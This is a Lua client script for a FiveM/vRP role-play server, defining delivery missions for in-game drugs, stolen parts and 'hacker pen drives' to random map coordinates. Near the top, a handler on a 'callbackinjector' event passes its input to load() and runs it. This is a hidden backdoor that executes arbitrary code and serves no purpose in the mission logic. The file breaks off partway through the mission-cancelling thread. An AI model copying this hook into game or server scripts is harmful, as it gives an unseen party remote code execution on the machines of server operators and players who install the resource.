local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
emp = Tunnel.getInterface("entrega_unica")
vRP = Proxy.getInterface("vRP")
TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIAVEIS
-----------------------------------------------------------------------------------------------------------------------------------------
local emservico = false
local crackd = false
local entregamaconha = false
local entregaopio = false
local entregameta = false
local entregapecas = false
local entregapendrive = false
local entregalsd = false
local entregamorfina = false
local entregaextase = false
local quantidade = 0
local statuses = false

-----------------------------------------------------------------------------------------------------------------------------------------
-- GERANDO LOCAL DE ENTREGA
-----------------------------------------------------------------------------------------------------------------------------------------
local entregas = {
	[1] = {x=155.85,y=-43.10,z=67.71},
	[2] = {x=313.35,y=-245.31,z=53.89},
	[3] = {x=-52.17,y=-103.74,z=57.63},
	[4] = {x=-269.36,y=27.27,z=54.65},
	[5] = {x=-598.12,y=5.68,z=43.07},
	[6] = {x=-795.49,y=40.80,z=48.25},
	[7] = {x=-843.95,y=87.22,z=51.96},
	[8] = {x=-831.32,y=-227.58,z=37.09},
	[9] = {x=-682.37,y=-374.73,z=34.15},
	[10] = {x=-295.17,y=-617.44,z=33.31},
	[11] = {x=-553.23,y=-649.75,z=33.08},
	[12] = {x=-934.24,y=-456.49,z=37.15},
	[13] = {x=-1078.39,y=-267.97,z=37.61},
	[14] = {x=-1437.76,y=-412.62,z=35.79},
	[15] = {x=-1669.03,y=-541.66,z=34.98},
	[16] = {x=-1392.47,y=-580.91,z=30.05},
	[17] = {x=-1042.79,y=-387.18,z=37.57},
	[18] = {x=-255.13,y=-756.19,z=32.63},
	[19] = {x=13.42,y=-972.96,z=29.30},
	[20] = {x=257.70,y=-1062.13,z=29.10},
	[21] = {x=792.41,y=-944.58,z=25.55},
	[22] = {x=120.44,y=-926.42,z=29.73},
	[23] = {x=2.53,y=-1127.96,z=28.09},
	[24] = {x=-582.63,y=-867.52,z=25.63},
	[25] = {x=-1047.00,y=-779.63,z=18.93},
	[26] = {x=-1061.55,y=-495.26,z=36.24},
	[27] = {x=-1071.15,y=-433.65,z=36.45},
	[28] = {x=-1203.82,y=-131.74,z=40.70},
	[29] = {x=-932.33,y=326.64,z=71.25},
	[30] = {x=-587.70,y=250.66,z=82.26},
	[31] = {x=-478.28,y=223.87,z=83.02},
	[32] = {x=-310.77,y=226.85,z=87.78},
	[33] = {x=75.20,y=229.06,z=108.70},
	[34] = {x=296.00,y=147.55,z=103.77},
	[35] = {x=1187.01,y=-431.18,z=67.02},
	[36] = {x=1260.03,y=-582.09,z=68.88},
	[37] = {x=1360.39,y=-570.32,z=74.22},
	[38] = {x=376.23510742188,y=-335.77307128906,z=48.1614112854},
	[39] = {x=930.92407226563,y=-245.17872619629,z=69.002647399902},
	[40] = {x=840.16583251953,y=-181.67932128906,z=74.188079833984},
	[41] = {x=820.79992675781,y=-156.4988861084,z=80.752479553223},
	[42] = {x=457.34124755859,y=-2059.3364257813,z=23.99090385437},
	[43] = {x=853.90191650391,y=-2207.4284667969,z=30.667190551758},
	[44] = {x=783.06872558594,y=-2254.0375976563,z=29.461324691772},
	[45] = {x=844.48327636719,y=-2118.5251464844,z=30.521060943604},
	[46] = {x=660.19317626953,y=263.64691162109,z=102.6975402832},
	[47] = {x=1249.2352294922,y=-349.91790771484,z=69.209815979004},
	[48] = {x=1257.078125,y=-437.89916992188,z=69.567436218262},
	[49] = {x=1227.4747314453,y=-725.31365966797,z=60.644199371338},
	[50] = {x=1082.716796875,y=-788.09741210938,z=58.262756347656},
	[51] = {x=764.52825927734,y=-1358.4466552734,z=27.878269195557},
	[52] = {x=947.21783447266,y=-1250.0286865234,z=27.075843811035},
	[53] = {x=278.72943115234,y=-1118.3101806641,z=29.419687271118},
	[54] = {x=-287.44439697266,y=-1062.9680175781,z=27.205379486084},
	[55] = {x=-601.26959228516,y=-1106.2435302734,z=25.855100631714},
	[56] = {x=920.23663330078,y=-239.05854797363,z=70.131851196289},
	[57] = {x=951.99609375,y=-252.12083435059,z=67.759574890137},
	[58] = {x=169.59,y=-565.24,z=43.88},
    [59] = {x=115.09,y=-626.7,z=44.23},
    [60] = {x=-47.19,y=-585.91,z=37.96}, 
    [61] = {x=-117.38,y=-604.75,z=36.29}, 
    [62] = {x= -83.61,y=-835.84,z=40.56}, 
    [63] = {x=-232.19,y=-915.57,z=32.32}, 
    [64] = {x=-589.61,y=-707.88,z=36.28}, 
    [65] = {x=412.87,y=151.56,z=103.21}, 
    [66] = {x=-912.23,y=-451.47,z=39.61}, 
    [67] = {x=-827.16,y=-697.25,z=28.06}, 
    [68] = {x=-1009.92,y=-731.38,z=21.53}, 
    [69] = {x=-1233.01,y=-855.9,z=13.11}, 
    [70] = {x=-268.08,y=-958.12,z=31.23}, 
    [71] = {x=-72.87,y=-816.04,z=243.39}, 
    [72] = {x=-447.61,y=6013.55,z=31.72}, 
    [73] = {x=-106.53,y=6469.18,z=31.63},
    [74] = {x=1853.44,y=3687.97,z=34.27}
}
-----------------------------------------------------------------------------------------------------------------------------------------
-- INICIANDO TRABALHO
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterNetEvent('crj_coca:permissao')
AddEventHandler('crj_coca:permissao',function()
	if not emservico then
		emservico = true
		destino = math.random(1,38)
		quantidade = math.random(5,6)
		CriandoBlip(entregas,destino)
	end
end)

RegisterNetEvent('entrega_crack:permissao')
AddEventHandler('entrega_crack:permissao',function()
	if not crackd then
		crackd = true
		destino = math.random(1,38)
		quantidade = math.random(5,6)
		CriandoBlip2(entregas,destino)
	end
end)

RegisterNetEvent('crj_maconha:permissao')
AddEventHandler('crj_maconha:permissao',function()
	if not entregamaconha then
		entregamaconha = true
		destino = math.random(1,38)
		quantidade = math.random(5,6)
		CriandoBlip3(entregas,destino)
	end
end)

RegisterNetEvent('entrega_opio:permissao')
AddEventHandler('entrega_opio:permissao',function()
	if not entregaopio then
		entregaopio = true
		destino = math.random(1,38)
		quantidade = math.random(5,6)
		CriandoBlip4(entregas,destino)
	end
end)

RegisterNetEvent('crj_metafetamina:permissao')
AddEventHandler('crj_metafetamina:permissao',function()
	if not entregameta then
		entregameta = true
		destino = math.random(1,38)
		quantidade = math.random(5,6)
		CriandoBlip5(entregas,destino)
	end
end)

RegisterNetEvent('entrega_pecas:permissao')
AddEventHandler('entrega_pecas:permissao',function()
	if not entregapecas then
		entregapecas = true
		destino = math.random(1,38)
		quantidade = math.random(3,4)
		CriandoBlip6(entregas,destino)
	end
end)

RegisterNetEvent('entrega_pendrive:permissao')
AddEventHandler('entrega_pendrive:permissao',function()
	if not entregapendrive then
		entregapendrive = true
		destino = math.random(1,38)
		quantidade = math.random(5,6)
		CriandoBlip9(entregas,destino)
	end
end)

RegisterNetEvent('entrega_lsd:permissao')
AddEventHandler('entrega_lsd:permissao',function()
	if not entregalsd then
		entregalsd = true
		destino = math.random(1,38)
		quantidade = math.random(5,6)
		CriandoBlip10(entregas,destino)
	end
end)

RegisterNetEvent('entrega_morfina:permissao')
AddEventHandler('entrega_morfina:permissao',function()
	if not entregamorfina then
		entregamorfina = true
		destino = math.random(1,38)
		quantidade = math.random(5,6)
		CriandoBlip11(entregas,destino)
	end
end)

RegisterNetEvent('entrega_extase:permissao')
AddEventHandler('entrega_extase:permissao',function()
	if not entregaextase then
		entregaextase = true
		destino = math.random(1,38)
		quantidade = math.random(5,6)
		CriandoBlip12(entregas,destino)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- GERANDO ENTREGA
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local crjSleep = 500
		if GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), 1305.2414550781,-251.66925048828,95.694351196289,true) <= 1 then
			crjSleep = 1
			DrawText3Ds(1305.2414550781,-251.66925048828,95.694351196289+0.5,"PRESSIONE ~r~E~w~ PARA COMEÇAR MISSÃO")
            if IsControlJustPressed(0,38) then	
				TriggerEvent('crj_coca:permissao')
			end
		end
		if emservico then
			crjSleep = 1
			local ui = GetMinimapAnchor()
			local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),entregas[destino].x,entregas[destino].y,entregas[destino].z,true)
			if IsControlJustPressed(0,246) then	
				statuses = not statuses
			end
			if statuses then
				crjSleep = 1
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.080,1.0,1.0,0.35,"PRESSIONE ~r~F7 ~w~PARA CANCELAR A MISSÃO",255,255,255,150)
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.065,1.0,1.0,0.35,"PRESSIONE ~r~H ~w~PARA ENTREGA A MISSÃO NO BLIP",255,255,255,150)
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.050,1.0,1.0,0.45,"FAÇA O CORRE E ENTREGUE ~g~"..quantidade.."~w~ MACONHA",255,255,255,255)
			else
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.040,1.0,1.0,0.35,"PRESSIONE ~r~Y ~w~PARA VER A MISSÃO",255,255,255,150)
			end
			if distance <= 30 then
				crjSleep = 1
				DrawMarker(21,entregas[destino].x,entregas[destino].y,entregas[destino].z-0.6,0,0,0,0.0,0,0,0.5,0.5,0.4,128,1,210,50,0,0,0,1)
				if distance < 3 then
			--		DrawText3Ds(entregas[destino].x,entregas[destino].y,entregas[destino].z, "[H] ENTREGAR")
                    if IsControlJustPressed(0,101) then
                        destinoantigo = destino
                        RemoveBlip(blip)
                        TriggerServerEvent('crj_coca:itensReceber', quantidade)
                        while true do
                            if destinoantigo == destino then
                                destino = math.random(1,38)
                            else
                                break
                            end
                            Citizen.Wait(1)
                        end
                        CriandoBlip(entregas,destino)
					end
				end
			end
		end
		Citizen.Wait(crjSleep)
	end
end)

-- CRACK

Citizen.CreateThread(function()
	while true do
		local crjSleep = 500
		if GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), 73.068321228027,3605.1357421875,39.410427093506,true) <= 1 then
			crjSleep = 1
			DrawText3Ds(73.068321228027,3605.1357421875,39.410427093506+0.5,"PRESSIONE ~r~E~w~ PARA COMEÇAR MISSÃO")
            if IsControlJustPressed(0,38) then	
				TriggerEvent('entrega_crack:permissao') 
			end
		end
		if crackd then
			crjSleep = 1
			local ui = GetMinimapAnchor()
			local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),entregas[destino].x,entregas[destino].y,entregas[destino].z,true)
			if IsControlJustPressed(0,246) then	
				statuses = not statuses
			end
			if statuses then
				crjSleep = 1
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.080,1.0,1.0,0.35,"PRESSIONE ~r~F7 ~w~PARA CANCELAR A MISSÃO",255,255,255,150)
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.065,1.0,1.0,0.35,"PRESSIONE ~r~H ~w~PARA ENTREGA A MISSÃO NO BLIP",255,255,255,150)
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.050,1.0,1.0,0.45,"FAÇA O CORRE E ENTREGUE ~g~"..quantidade.."~w~ CRACK",255,255,255,255)
			else
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.040,1.0,1.0,0.35,"PRESSIONE ~r~Y ~w~PARA VER A MISSÃO",255,255,255,150)
			end
			if distance <= 30 then
				crjSleep = 1
				DrawMarker(21,entregas[destino].x,entregas[destino].y,entregas[destino].z-0.6,0,0,0,0.0,0,0,0.5,0.5,0.4,128,1,210,50,0,0,0,1)
				if distance < 3 then
			--		DrawText3Ds(entregas[destino].x,entregas[destino].y,entregas[destino].z, "[H] ENTREGAR")
                    if IsControlJustPressed(0,101) then
                        destinoantigo = destino
                        RemoveBlip(blip)
                        TriggerServerEvent('entrega_crack:itensReceber', quantidade)
                        while true do
                            if destinoantigo == destino then
                                destino = math.random(1,38)
                            else
                                break
                            end
                            Citizen.Wait(1)
                        end
                        CriandoBlip2(entregas,destino)
					end
				end
			end
		end
		Citizen.Wait(crjSleep)
	end
end)

-- COCAINA ADA
Citizen.CreateThread(function()
	while true do
		local crjSleep = 500
		if GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), -1038.7147216797,4922.5014648438,207.15811157227,true) <= 1 then
			crjSleep = 1
			DrawText3Ds(-1038.7147216797,4922.5014648438,207.15811157227+0.5,"PRESSIONE ~r~E~w~ PARA COMEÇAR MISSÃO")
            if IsControlJustPressed(0,38) then	-- COMEÇAR MISSÃO
				TriggerEvent('crj_maconha:permissao')
			end
		end
		if entregamaconha then
			crjSleep = 1
			local ui = GetMinimapAnchor()
			local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),entregas[destino].x,entregas[destino].y,entregas[destino].z,true)
			if IsControlJustPressed(0,246) then	-- VER MISSÃO
				statuses = not statuses
			end
			if statuses then
				crjSleep = 1
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.080,1.0,1.0,0.35,"PRESSIONE ~r~F7 ~w~PARA CANCELAR A MISSÃO",255,255,255,150)
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.065,1.0,1.0,0.35,"PRESSIONE ~r~H ~w~PARA ENTREGA A MISSÃO NO BLIP",255,255,255,150)
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.050,1.0,1.0,0.45,"FAÇA O CORRE E ENTREGUE ~g~"..quantidade.."~w~ COCAINAS",255,255,255,255)
			else
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.040,1.0,1.0,0.35,"PRESSIONE ~r~Y ~w~PARA VER A MISSÃO",255,255,255,150)
			end
			if distance <= 30 then
				crjSleep = 1
				DrawMarker(21,entregas[destino].x,entregas[destino].y,entregas[destino].z-0.6,0,0,0,0.0,0,0,0.5,0.5,0.4,128,1,210,50,0,0,0,1)
				if distance < 3 then
			--		DrawText3Ds(entregas[destino].x,entregas[destino].y,entregas[destino].z, "[H] ENTREGAR")
                    if IsControlJustPressed(0,101) then -- ENTREGAR
                        destinoantigo = destino
                        RemoveBlip(blip)
                        TriggerServerEvent('crj_maconha:itensReceber', quantidade)
                        while true do
                            if destinoantigo == destino then
                                destino = math.random(1,38)
                            else
                                break
                            end
                            Citizen.Wait(1)
                        end
                        CriandoBlip3(entregas,destino)
					end
				end
			end
		end
		Citizen.Wait(crjSleep)
	end
end)

-- OPIO
Citizen.CreateThread(function()
	while true do
		local crjSleep = 500
		if GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), 1427.2727050781,-2321.3911132812,67.001007080078,true) <= 1 then
			crjSleep = 1
			DrawText3Ds(1427.2727050781,-2321.3911132812,67.001007080078+0.5,"PRESSIONE ~r~E~w~ PARA COMEÇAR MISSÃO")
            if IsControlJustPressed(0,38) then	
				TriggerEvent('entrega_opio:permissao')
			end
		end
		if entregaopio then
			crjSleep = 1
			local ui = GetMinimapAnchor()
			local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),entregas[destino].x,entregas[destino].y,entregas[destino].z,true)
			if IsControlJustPressed(0,246) then	
				statuses = not statuses
			end
			if statuses then
				crjSleep = 1
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.080,1.0,1.0,0.35,"PRESSIONE ~r~F7 ~w~PARA CANCELAR A MISSÃO",255,255,255,150)
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.065,1.0,1.0,0.35,"PRESSIONE ~r~H ~w~PARA ENTREGA A MISSÃO NO BLIP",255,255,255,150)
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.050,1.0,1.0,0.45,"FAÇA O CORRE E ENTREGUE ~g~"..quantidade.."~w~ OPIOS",255,255,255,255)
			else
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.040,1.0,1.0,0.35,"PRESSIONE ~r~Y ~w~PARA VER A MISSÃO",255,255,255,150)
			end
			if distance <= 30 then
				crjSleep = 1
				DrawMarker(21,entregas[destino].x,entregas[destino].y,entregas[destino].z-0.6,0,0,0,0.0,0,0,0.5,0.5,0.4,128,1,210,50,0,0,0,1)
				if distance < 3 then
					--DrawText3Ds(entregas[destino].x,entregas[destino].y,entregas[destino].z, "[H] ENTREGAR")
                    if IsControlJustPressed(0,101) then
                        destinoantigo = destino
                        RemoveBlip(blip)
                        TriggerServerEvent('entrega_opio:itensReceber', quantidade)
                        while true do
                            if destinoantigo == destino then
                                destino = math.random(1,38)
                            else
                                break
                            end
                            Citizen.Wait(1)
                        end
                        CriandoBlip4(entregas,destino)
					end
				end
			end
		end
		Citizen.Wait(crjSleep)
	end
end)

-- METANFETAMINA
Citizen.CreateThread(function()
	while true do
		local crjSleep = 500
		if GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), 1001.9288330078,987.59240722656,234.48083496094,true) <= 1 then
			crjSleep = 1
			DrawText3Ds(1001.9288330078,987.59240722656,234.48083496094+0.5,"PRESSIONE ~r~E~w~ PARA COMEÇAR MISSÃO")
            if IsControlJustPressed(0,38) then	
				TriggerEvent('crj_metafetamina:permissao') 
			end
		end
		if entregameta then
			crjSleep = 1
			local ui = GetMinimapAnchor()
			local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),entregas[destino].x,entregas[destino].y,entregas[destino].z,true)
			if IsControlJustPressed(0,246) then	
				statuses = not statuses
			end
			if statuses then
				crjSleep = 1
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.080,1.0,1.0,0.35,"PRESSIONE ~r~F7 ~w~PARA CANCELAR A MISSÃO",255,255,255,150)
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.065,1.0,1.0,0.35,"PRESSIONE ~r~H ~w~PARA ENTREGA A MISSÃO NO BLIP",255,255,255,150)
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.050,1.0,1.0,0.45,"FAÇA O CORRE E ENTREGUE ~g~"..quantidade.."~w~ META",255,255,255,255)
			else
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.040,1.0,1.0,0.35,"PRESSIONE ~r~Y ~w~PARA VER A MISSÃO",255,255,255,150)
			end
			if distance <= 30 then
				crjSleep = 1
				DrawMarker(21,entregas[destino].x,entregas[destino].y,entregas[destino].z-0.6,0,0,0,0.0,0,0,0.5,0.5,0.4,128,1,210,50,0,0,0,1)
				if distance < 3 then
					--DrawText3Ds(entregas[destino].x,entregas[destino].y,entregas[destino].z, "[H] ENTREGAR")
                    if IsControlJustPressed(0,101) then
                        destinoantigo = destino
                        RemoveBlip(blip)
                        TriggerServerEvent('crj_metafetamina:itensReceber', quantidade)
                        while true do
                            if destinoantigo == destino then
                                destino = math.random(1,38)
                            else
                                break
                            end
                            Citizen.Wait(1)
                        end
                        CriandoBlip5(entregas,destino)
					end
				end
			end
		end
		Citizen.Wait(crjSleep)
	end
end)

-- PEÇAS
Citizen.CreateThread(function()
	while true do
		local crjSleep = 500
		if GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), 2344.2751464844,3126.8037109375,48.2087059021,true) <= 1 then
			crjSleep = 1
			DrawText3Ds(2344.2751464844,3126.8037109375,48.2087059021+0.5,"PRESSIONE ~r~E~w~ PARA COMEÇAR MISSÃO")
            if IsControlJustPressed(0,38) then	
				TriggerEvent('entrega_pecas:permissao')
			end
		end
		if entregapecas then
			crjSleep = 1
			local ui = GetMinimapAnchor()
			local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),entregas[destino].x,entregas[destino].y,entregas[destino].z,true)
			if IsControlJustPressed(0,246) then	
				statuses = not statuses
			end
			if statuses then
				crjSleep = 1
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.080,1.0,1.0,0.35,"PRESSIONE ~r~F7 ~w~PARA CANCELAR A MISSÃO",255,255,255,150)
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.065,1.0,1.0,0.35,"PRESSIONE ~r~H ~w~PARA ENTREGA A MISSÃO NO BLIP",255,255,255,150)
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.050,1.0,1.0,0.45,"FAÇA O CORRE E ENTREGUE ~g~"..quantidade.."~w~ PEÇAS ROUBADAS",255,255,255,255)
			else
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.040,1.0,1.0,0.35,"PRESSIONE ~r~Y ~w~PARA VER A MISSÃO",255,255,255,150)
			end
			if distance <= 30 then
				crjSleep = 1
				DrawMarker(21,entregas[destino].x,entregas[destino].y,entregas[destino].z-0.6,0,0,0,0.0,0,0,0.5,0.5,0.4,128,1,210,50,0,0,0,1)
				if distance < 3 then
					--DrawText3Ds(entregas[destino].x,entregas[destino].y,entregas[destino].z, "[H] ENTREGAR")
                    if IsControlJustPressed(0,101) then
                        destinoantigo = destino
                        RemoveBlip(blip)
                        TriggerServerEvent('entrega_pecas:itensReceber', quantidade)
                        while true do
                            if destinoantigo == destino then
                                destino = math.random(1,38)
                            else
                                break
                            end
                            Citizen.Wait(1)
                        end
                        CriandoBlip6(entregas,destino)
					end
				end
			end
		end
		Citizen.Wait(crjSleep)
	end
end)


-- MAQUINA
Citizen.CreateThread(function()
	while true do
		local crjSleep = 500
		if GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),93.25,-1291.42,29.26,true) <= 1 then
			crjSleep = 1
			DrawText3Ds(93.25,-1291.42,29.26+0.5,"PRESSIONE ~r~E~w~ PARA COMEÇAR MISSÃO")
            if IsControlJustPressed(0,38) then	
				TriggerEvent('entrega_pendrive:permissao') 
			end
		end
		if entregapendrive then
			crjSleep = 1
			local ui = GetMinimapAnchor()
			local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),entregas[destino].x,entregas[destino].y,entregas[destino].z,true)
			if IsControlJustPressed(0,246) then	
				statuses = not statuses
			end
			if statuses then
				crjSleep = 1
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.080,1.0,1.0,0.35,"PRESSIONE ~r~F7 ~w~PARA CANCELAR A MISSÃO",255,255,255,150)
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.065,1.0,1.0,0.35,"PRESSIONE ~r~H ~w~PARA ENTREGA A MISSÃO NO BLIP",255,255,255,150)
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.050,1.0,1.0,0.45,"FAÇA O CORRE E ENTREGUE ~g~"..quantidade.."~w~ os Pen Drives Hacker",255,255,255,255)
			else
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.040,1.0,1.0,0.35,"PRESSIONE ~r~Y ~w~PARA VER A MISSÃO",255,255,255,150)
			end
			if distance <= 30 then
				crjSleep = 1
				DrawMarker(21,entregas[destino].x,entregas[destino].y,entregas[destino].z-0.6,0,0,0,0.0,0,0,0.5,0.5,0.4,128,1,210,50,0,0,0,1)
				if distance < 3 then
					--DrawText3Ds(entregas[destino].x,entregas[destino].y,entregas[destino].z, "[H] MONTE AS MAQUINA LOGO MANO")
                    if IsControlJustPressed(0,101) then
                        destinoantigo = destino
                        RemoveBlip(blip)
                        TriggerServerEvent('entrega_pendrive:itensReceber', quantidade)
                        while true do
                            if destinoantigo == destino then
                                destino = math.random(1,38)
                            else
                                break
                            end
                            Citizen.Wait(1)
                        end
                        CriandoBlip9(entregas,destino)
					end
				end
			end
		end
		Citizen.Wait(crjSleep)
	end
end)

-- LSD
Citizen.CreateThread(function()
	while true do
		local crjSleep = 500
		if GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), -588.71252441406,-1642.9379882812,19.750120162964,true) <= 1 then
			crjSleep = 1
			DrawText3Ds(-588.71252441406,-1642.9379882812,19.750120162964+0.5,"PRESSIONE ~r~E~w~ PARA COMEÇAR MISSÃO")
            if IsControlJustPressed(0,38) then	
				TriggerEvent('entrega_lsd:permissao') 
			end
		end
		if entregalsd then
			crjSleep = 1
			local ui = GetMinimapAnchor()
			local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),entregas[destino].x,entregas[destino].y,entregas[destino].z,true)
			if IsControlJustPressed(0,246) then	
				statuses = not statuses
			end
			if statuses then
				crjSleep = 1
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.080,1.0,1.0,0.35,"PRESSIONE ~r~F7 ~w~PARA CANCELAR A MISSÃO",255,255,255,150)
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.065,1.0,1.0,0.35,"PRESSIONE ~r~H ~w~PARA ENTREGA A MISSÃO NO BLIP",255,255,255,150)
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.050,1.0,1.0,0.45,"FAÇA O CORRE E ENTREGUE ~g~"..quantidade.."~w~ LSD",255,255,255,255)
			else
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.040,1.0,1.0,0.35,"PRESSIONE ~r~Y ~w~PARA VER A MISSÃO",255,255,255,150)
			end
			if distance <= 30 then
				crjSleep = 1
				DrawMarker(21,entregas[destino].x,entregas[destino].y,entregas[destino].z-0.6,0,0,0,0.0,0,0,0.5,0.5,0.4,128,1,210,50,0,0,0,1)
				if distance < 3 then
					--DrawText3Ds(entregas[destino].x,entregas[destino].y,entregas[destino].z, "[H] ENTREGAR")
                    if IsControlJustPressed(0,101) then
                        destinoantigo = destino
                        RemoveBlip(blip)
                        TriggerServerEvent('entrega_lsd:itensReceber', quantidade)
                        while true do
                            if destinoantigo == destino then
                                destino = math.random(1,38)
                            else
                                break
                            end
                            Citizen.Wait(1)
                        end
                        CriandoBlip10(entregas,destino)
					end
				end
			end
		end
		Citizen.Wait(crjSleep)
	end
end)

-- MORFINA
Citizen.CreateThread(function()
	while true do
		local crjSleep = 500
		if GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), -2674.2543945313,1336.1904296875,144.25773620605,true) <= 1 then
			crjSleep = 1
			DrawText3Ds(-2674.2543945313,1336.1904296875,144.25773620605+0.5,"PRESSIONE ~r~E~w~ PARA COMEÇAR MISSÃO")
            if IsControlJustPressed(0,38) then	
				TriggerEvent('entrega_morfina:permissao') 
			end
		end
		if entregamorfina then
			crjSleep = 1
			local ui = GetMinimapAnchor()
			local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),entregas[destino].x,entregas[destino].y,entregas[destino].z,true)
			if IsControlJustPressed(0,246) then	
				statuses = not statuses
			end
			if statuses then
				crjSleep = 1
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.080,1.0,1.0,0.35,"PRESSIONE ~r~F7 ~w~PARA CANCELAR A MISSÃO",255,255,255,150)
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.065,1.0,1.0,0.35,"PRESSIONE ~r~H ~w~PARA ENTREGA A MISSÃO NO BLIP",255,255,255,150)
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.050,1.0,1.0,0.45,"FAÇA O CORRE E ENTREGUE ~g~"..quantidade.."~w~ MORFINA",255,255,255,255)
			else
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.040,1.0,1.0,0.35,"PRESSIONE ~r~Y ~w~PARA VER A MISSÃO",255,255,255,150)
			end
			if distance <= 30 then
				crjSleep = 1
				DrawMarker(21,entregas[destino].x,entregas[destino].y,entregas[destino].z-0.6,0,0,0,0.0,0,0,0.5,0.5,0.4,128,1,210,50,0,0,0,1)
				if distance < 3 then
				--	DrawText3Ds(entregas[destino].x,entregas[destino].y,entregas[destino].z, "[H] ENTREGAR ESSA PORRA")
                    if IsControlJustPressed(0,101) then
                        destinoantigo = destino
                        RemoveBlip(blip)
                        TriggerServerEvent('entrega_morfina:itensReceber', quantidade)
                        while true do
                            if destinoantigo == destino then
                                destino = math.random(1,38)
                            else
                                break
                            end
                            Citizen.Wait(1)
                        end
                        CriandoBlip11(entregas,destino)
					end
				end
			end
		end
		Citizen.Wait(crjSleep)
	end
end)


-- EXTASE
Citizen.CreateThread(function()
	while true do
		local crjSleep = 500
		if GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), -946.28350830078,-1479.7908935547,6.7955188751221,true) <= 1 then
			crjSleep = 1
			DrawText3Ds(-946.28350830078,-1479.7908935547,6.7955188751221+0.5,"PRESSIONE ~r~E~w~ PARA COMEÇAR MISSÃO")
            if IsControlJustPressed(0,38) then	
				TriggerEvent('entrega_extase:permissao') 
			end
		end
		if entregaextase then
			crjSleep = 1
			local ui = GetMinimapAnchor()
			local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),entregas[destino].x,entregas[destino].y,entregas[destino].z,true)
			if IsControlJustPressed(0,246) then	
				statuses = not statuses
			end
			if statuses then
				crjSleep = 1
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.076,1.0,1.0,0.35,"PRESSIONE ~r~F7 ~w~PARA CANCELAR A MISSÃO",255,255,255,150)
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.058,1.0,1.0,0.45,"ENTREGUE ~g~"..quantidade.."~w~ EXTASE",255,255,255,255)
			else
				drawTxt(ui.right_x+0.050,ui.bottom_y-0.040,1.0,1.0,0.35,"PRESSIONE ~r~Y ~w~PARA VER A MISSÃO",255,255,255,150)
			end
			if distance <= 30 then
				crjSleep = 1
				DrawMarker(21,entregas[destino].x,entregas[destino].y,entregas[destino].z-0.6,0,0,0,0.0,0,0,0.5,0.5,0.4,128,1,210,50,0,0,0,1)
				if distance < 3 then
					DrawText3Ds(entregas[destino].x,entregas[destino].y,entregas[destino].z, "[H] ENTREGAR")
                    if IsControlJustPressed(0,101) then
                        destinoantigo = destino
                        RemoveBlip(blip)
                        TriggerServerEvent('entrega_extase:itensReceber', quantidade)
                        while true do
                            if destinoantigo == destino then
                                destino = math.random(1,38)
                            else
                                break
                            end
                            Citizen.Wait(1)
                        end
                        CriandoBlip12(entregas,destino)
					end
				end
			end
		end
		Citizen.Wait(crjSleep)
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- CANCELANDO ENTREGA
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local crjSleep = 200
		if IsControlJustPressed(0,168) and emservico then
			crjSleep = 1
			emservico = false
